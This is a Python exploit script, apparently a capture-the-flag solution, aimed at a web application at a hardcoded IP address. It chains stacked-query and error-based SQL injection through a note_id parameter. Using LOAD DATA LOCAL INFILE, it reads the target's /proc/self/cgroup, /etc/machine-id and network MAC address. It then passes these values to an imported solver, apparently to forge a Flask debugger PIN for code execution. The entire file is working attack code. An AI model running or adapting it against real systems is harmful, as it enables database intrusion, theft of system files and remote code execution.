import requests
import re
import string
import random
from old_pin import solve


def get_content(file, regexp):
    ans = ''
    z = 1
    while True:
        try:
            tmp_database = get_random_id()
            path = f"view?note_id=';CREATE TABLE IF NOT EXISTS {tmp_database}(cmd text);Load data local infile '{file}' into table {tmp_database};select * from users where username=1 and (extractvalue(1,concat(0x7e,(select substr((select group_concat(cmd) from {tmp_database}),{str(z)},{str(20)})),0x7e)));"
            view_url = base_url + path
            r = s.get(url=view_url)
            content = re.findall("'~(.*?)'", r.text)[0]
            if content[0] == '~':
                break
            ans += content[:-1]
            if content[-1] != '~':
                break
            z += 20
            print(ans)

        except Exception as e:
            print(e)
            break
    k = re.findall(regexp, ans)[0]
    print('k is: ', k)
    return k


def get_random_id():
    alphabet = list(string.ascii_lowercase + string.digits)
    return ''.join([random.choice(alphabet) for _ in range(32)])


base_url = 'http://localhost:5002/'
base_url = 'http://124.223.208.221:5002/'
s = requests.session()

login_data = {
    'username': "veererere",
    'password': "fefefef"
}
proxies = {
    'http': 'http://172.17.0.1:5002'
}
login_url = base_url + 'login'
r = s.post(url=login_url, data=login_data, proxies=proxies)

cgroup = get_content('/proc/self/cgroup', 'docker/(.*?),')
machine_id = get_content('/etc/machine-id', '(.*)')
eth0 = get_content('/sys/class/net/eth0/address', '(.*)')

eth0 = str(int(eth0.replace(':', ''), 16))

print("eth0 is: ", eth0)
print("machine_id is: ", machine_id)
print("cgroup is: ", cgroup)
solve('CTF', eth0, machine_id, cgroup)

